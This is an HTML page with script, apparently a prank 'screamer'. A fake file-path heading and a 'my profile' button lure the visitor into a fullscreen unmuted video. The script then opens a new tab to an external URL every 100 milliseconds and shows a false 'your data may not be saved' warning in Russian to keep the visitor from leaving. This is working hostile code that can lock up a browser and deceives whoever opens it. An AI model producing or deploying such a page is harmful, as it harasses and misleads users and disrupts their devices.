<div id="clickbait-container">
    <h1>C:\Users\SystemX\Pictures\Saved Pictures\03.03.2026.png</h1>
    <p> </p>
    <button id="start-button">my profile</button>
</div>

<div id="scare-video-container">
    <video id="video" src="media/video.mp4" loop playsinline></video>
</div>

<script type="text/javascript">
    const video = document.getElementById("video");
    const targetUrl = "https://penis-git-main-fe1zyyys-projects.vercel.app/";
    const startButton = document.getElementById("start-button");
    const clickbaitContainer = document.getElementById("clickbait-container");
    const scareVideoContainer = document.getElementById("scare-video-container");

    console.log("Элементы:");
    console.log("video:", video);
    console.log("startButton:", startButton);
    console.log("clickbaitContainer:", clickbaitContainer);
    console.log("scareVideoContainer:", scareVideoContainer);

    window.addEventListener('beforeunload', function(e) {
        e.preventDefault();
        e.returnValue = 'Ваши данные могут не сохраниться, точно закрыть?';
        return 'Ваши данные могут не сохраниться, точно закрыть?';
    });

    function requestFullscreenAndUnmute() {
        console.log("Attempting to request fullscreen and unmute.");
        
        if (video.muted) {
            video.muted = false;
            console.log("Video unmuted by user interaction.");
        }

        const { documentElement } = document;
        if(documentElement.requestFullscreen) {
            documentElement.requestFullscreen();
        } else if(documentElement.mozRequestFullScreen) { 
            documentElement.mozRequestFullScreen();
        } else if(documentElement.webkitRequestFullscreen) { 
            documentElement.webkitRequestFullscreen();
        } else if(documentElement.msRequestFullscreen) { 
            documentElement.msRequestFullscreen();
        }
    }

    function openNewTab() {
        console.log("Attempting to open new tab:", targetUrl);
        window.open(targetUrl, '_blank');
    }

    function startScareSequence() {
        console.log("startScareSequence() called.");

        clickbaitContainer.style.display = 'none';
        scareVideoContainer.style.display = 'block';
        console.log("Containers visibility toggled.");

        video.muted = true; 
        
        video.play()
            .then(() => {
                console.log("Video playback started successfully (muted).");
                requestFullscreenAndUnmute(); 
            })
            .catch(error => {
                console.error("Autoplay failed:", error);
                alert("Не удалось запустить видео автоматически. Пожалуйста, кликните по экрану.");
            });
        
        setTimeout(() => {
            console.log("Starting to open new tabs after 1 second...");
            setInterval(openNewTab, 100);
        }, 1000);
    }

    if (startButton) {
        startButton.addEventListener('click', startScareSequence);
        console.log("Event listener added to start Button.");
    } else {
        console.error("startButton not found!");
    }

    if (video) {
        video.addEventListener("click", requestFullscreenAndUnmute);
        console.log("Event listener added to video for fullscreen and unmute.");
    } else {
        console.error("video element not found!");
    }

</script>
